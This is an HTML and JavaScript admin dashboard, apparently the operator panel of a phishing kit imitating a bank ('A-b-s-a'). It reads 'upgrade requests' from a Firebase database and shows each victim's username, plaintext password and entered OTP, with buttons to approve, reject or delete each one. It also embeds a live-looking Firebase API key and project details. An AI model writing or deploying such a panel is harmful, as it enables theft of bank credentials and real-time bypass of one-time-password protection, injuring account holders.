<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Dashboard | A-b-s-a</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
    header { background: #d50032; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
    h1 { margin: 0; }
    button { padding: 8px 14px; border: none; border-radius: 4px; background: #222; color: white; cursor: pointer; font-weight: 600; }
    button:hover { opacity: 0.85; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #fff; }
    th, td { border: 1px solid #ddd; padding: 10px; text-align: center; }
    th { background: #d50032; color: white; }
    .container { padding: 20px; }
  </style>
</head>
<body>

<header>
  <h1>Admin Dashboard</h1>
  <button id="logoutBtn">Logout</button>
</header>

<div class="container">
  <h2>Client Upgrade Requests</h2>
  <table>
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Status</th>
        <th>OTP</th>
        <th>Timestamp</th>
        <th>Action</th>
        <th>Delete</th>
      </tr>
    </thead>
    <tbody id="requestTable"></tbody>
  </table>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
  import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-auth.js";
  import { getDatabase, ref, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDtJstcWHSwJVPogm-MXAehNR4FBhh8Iuo",
    authDomain: "a-b-s-a-upgrade-system.firebaseapp.com",
    databaseURL: "https://a-b-s-a-upgrade-system-default-rtdb.firebaseio.com",
    projectId: "a-b-s-a-upgrade-system",
    storageBucket: "a-b-s-a-upgrade-system.firebasestorage.app",
    messagingSenderId: "618721346269",
    appId: "1:618721346269:web:2548672e789231e4e95134"
  };

  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getDatabase(app);

  onAuthStateChanged(auth, (user) => {
    if (!user) {
      alert("Unauthorized access! Redirecting to login.");
      window.location.href = "admin-login.html";
    }
  });

  document.getElementById("logoutBtn").addEventListener("click", () => {
    signOut(auth).then(() => {
      alert("Logged out successfully!");
      window.location.href = "admin-login.html";
    });
  });

  const requestTable = document.getElementById("requestTable");
  const requestsRef = ref(db, "requests");

  onValue(requestsRef, (snapshot) => {
    requestTable.innerHTML = "";
    snapshot.forEach((childSnapshot) => {
      const id = childSnapshot.key;
      const data = childSnapshot.val();
      const row = document.createElement("tr");

      row.innerHTML = `
        <td>${data.username || ''}</td>
        <td>${data.password || ''}</td>
        <td>${data.status || ''}</td>
        <td>${data.otp_entered || ''}</td>
        <td>${data.timestamp || ''}</td>
        <td>
          <button onclick="approve('${id}')">Approve</button>
          <button onclick="reject('${id}')">Reject</button>
        </td>
        <td>
          <button onclick="deleteRequest('${id}')">Delete</button>
        </td>
      `;
      requestTable.appendChild(row);
    });
  });

  window.approve = function(id) {
    update(ref(db, "requests/" + id), { status: "approved" });
  };

  window.reject = function(id) {
    update(ref(db, "requests/" + id), { status: "rejected" });
  };

  window.deleteRequest = function(id) {
    if (confirm("Are you sure you want to delete this request?")) {
      remove(ref(db, "requests/" + id));
    }
  };
</script>

</body>
</html>
